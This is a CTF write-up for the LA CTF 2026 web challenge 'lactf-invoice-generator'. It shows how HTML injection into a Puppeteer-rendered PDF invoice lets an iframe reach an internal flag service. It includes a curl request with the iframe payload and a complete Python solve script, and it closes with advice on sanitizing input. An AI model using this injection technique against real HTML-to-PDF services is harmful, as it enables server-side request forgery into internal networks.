---
title: "[Web] lactf-invoice-generator"
description: Writeup for "lactf-invoice-generator" from LA CTF 2026.
date: 2026-02-10 01:00:00 +0900
categories: [CTF, LA CTF 2026]
tags: [Web]
toc: true
comments: false
---

## TL;DR

The invoice generator inserts user input directly into HTML without sanitization, then renders it with headless Chrome (Puppeteer) and saves it as a PDF.

By injecting an `<iframe>` pointing to the internal `flag` service, the PDF contains the flag page — and we can extract it with `pdftotext`.

---

## Overview

- **invoice-generator** — public-facing service
- **flag** (`http://flag:8081/flag`) — internal only, not reachable from outside

The server takes user input → builds an HTML invoice → Puppeteer renders it → returns a PDF.
Since the input goes into HTML with no escaping, we can inject any HTML tag we want.

---

## Root Cause

User input is placed directly into the invoice HTML template with no escaping or sanitization.
Puppeteer (running inside the internal network) renders this HTML — so any tag we inject gets executed by a real browser.

This means we can make the browser load internal URLs that are unreachable from the outside.

---

## Exploit

Inject an `<iframe>` in the `item` field pointing to the internal flag service.
Puppeteer renders the page (including the iframe content), and the flag appears in the PDF.

### Request

```bash
curl -s -X POST "https://<INSTANCE>/generate-invoice" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test",
    "item": "<iframe src=\"http://flag:8081/flag\" style=\"width:900px;height:300px\"></iframe>",
    "cost": "1",
    "datePurchased": "2026-01-01"
  }' --output invoice.pdf
```

### Extract the flag from the PDF

```bash
sudo apt-get install -y poppler-utils
pdftotext invoice.pdf - | grep -o 'lactf{[^}]*}'
```

---

## Flag

```
lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}
```

---

## solve.py

```python
#!/usr/bin/env python3
import argparse, re, subprocess, sys
from urllib.parse import urljoin
import requests

PAYLOAD = '<iframe src="http://flag:8081/flag" style="width:900px;height:300px"></iframe>'
FLAG_RE = re.compile(r"lactf\{[^}]+\}")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="e.g. https://<INSTANCE>")
    ap.add_argument("--out", default="invoice.pdf")
    args = ap.parse_args()

    # Generate PDF with injected iframe
    r = requests.post(urljoin(args.base.rstrip("/") + "/", "generate-invoice"),
                      json={"name": "test", "item": PAYLOAD, "cost": "1", "datePurchased": "2026-01-01"},
                      timeout=30)
    r.raise_for_status()

    with open(args.out, "wb") as f:
        f.write(r.content)
    print(f"[+] Saved: {args.out}")

    # Extract flag from PDF
    try:
        text = subprocess.check_output(["pdftotext", args.out, "-"],
                                       stderr=subprocess.STDOUT).decode(errors="ignore")
    except FileNotFoundError:
        sys.exit("[!] pdftotext not found. Run: sudo apt-get install -y poppler-utils")

    m = FLAG_RE.search(text)
    print(f"[+] Flag: {m.group(0)}" if m else "[!] Flag not found in PDF")

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
python3 solve.py --base "https://<INSTANCE>"
```

---

## Notes

Never insert raw user input into HTML that will be rendered server-side.
Always escape or sanitize input before use — especially when a headless browser is involved, since it can reach internal services that are not exposed to the public.
